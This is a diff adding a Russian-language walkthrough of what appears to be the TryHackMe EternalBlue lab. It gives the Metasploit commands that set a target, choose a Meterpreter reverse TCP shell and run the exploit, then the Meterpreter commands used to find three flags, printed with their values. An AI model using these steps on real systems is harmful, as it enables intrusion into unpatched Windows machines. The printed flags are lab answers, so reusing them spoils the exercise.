@@ -41,3 +41,43 @@
 
 ![Решения](images/15.png)
 
+Как видим, нам нужно установить IP-адрес целевой машины в параметр **`RHOSTS`**, а также выбрать полезную нагрузку (Payload) для получения обратного шелла.
+
+Установим IP цели:
+`set RHOSTS 10.113.175.188`
+
+Теперь выберем Payload (обратный TCP-шелл для Meterpreter):
+`set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+
+Посмотрим на опции Payload, чтобы убедиться, что `LHOST` (наш IP) подставился автоматически:
+`show options`
+
+Вводим `run` (или `exploit`) и ждем, пока Metasploit подберет нужный смещение памяти и отправит эксплойт. Если всё успешно, мы получим сессию Meterpreter.
+
+---
+
+## 4. Поиск флагов
+
+`cd C:\\`
+`cat flag1.txt`
+Вывод: `flag{access_the_machine}`
+
+`search -f flag2.txt`
+`cd Windows\\System32\\config\\`
+`cat flag2.txt`
+Вывод: `flag{sam_database_elevated_access}`
+
+`cd Users\\`
+`ls`
+`cd Jon\\`
+`cd Documents\\`
+`ls`
+`cat flag3.txt`
+Вывод: `flag{admin_documents_can_be_valuable}`
+Скопируем оба флага и отправим их в ответы на TryHackMe. Лаба решена!
+
+---
+
+## 6. Причина уязвимости
+
+Уязвимость EternalBlue (CVE-2017-0143) возникает из-за ошибки переполнения буфера в реализации протокола SMBv1 в Windows. Специально сформированный пакет вызывает сбой в обработке памяти, что позволяет злоумышленнику выполнить произвольный код с правами `NT AUTHORITY\SYSTEM`.
